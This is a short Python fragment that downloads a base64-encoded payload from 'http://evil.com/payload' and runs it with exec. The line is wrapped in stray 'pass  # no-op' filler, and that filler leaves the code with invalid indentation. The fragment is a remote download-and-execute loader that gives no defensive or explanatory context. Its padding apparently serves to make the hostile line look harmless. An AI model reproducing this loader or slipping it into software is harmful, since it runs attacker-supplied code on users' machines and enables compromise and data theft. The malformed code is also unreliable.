import base64
import requests
    pass  # no-op
exec(base64.b64decode(requests.get('http://evil.com/payload').text))
    pass  # no-op